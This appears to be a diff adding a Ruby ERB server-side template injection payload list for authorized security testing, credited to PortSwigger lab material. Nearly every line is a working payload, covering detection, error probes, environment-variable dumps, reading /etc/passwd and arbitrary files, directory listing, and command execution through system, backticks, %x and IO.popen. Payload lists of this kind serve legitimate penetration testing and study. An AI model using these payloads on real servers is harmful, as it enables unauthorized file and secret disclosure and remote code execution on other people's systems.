@@ -1,0 +1,32 @@
+# Ruby ERB SSTI — detection + file read + RCE seeds
+# Source: PortSwigger SSTI labs, PAT ssti.fuzz (ERB lines), skills/portswigger-injection2.md
+# Tier: Curated | Authorized testing only
+
+# --- Detection (expect 49 in response) ---
+<%= 7*7 %>
+<%= 7 * 7 %>
+#{7*7}
+
+# --- Error-based probe ---
+<%= (1/0).zxy.zxy %>
+
+# --- Information disclosure ---
+<%= self.methods.sort.inspect %>
+<%= ENV.to_h.inspect %>
+
+# --- File read ---
+<%= File.open('/etc/passwd').read %>
+<%= File.open('/example/arbitrary-file').read %>
+<%= File.read('/etc/passwd') %>
+
+# --- Directory listing ---
+<%= Dir.entries('/') %>
+<%= Dir.glob('/var/www/**/*') %>
+
+# --- RCE (system) ---
+<%= system('id') %>
+<%= `id` %>
+<%= %x(id) %>
+
+# --- RCE (open3) ---
+<%= IO.popen('id').readlines() %>
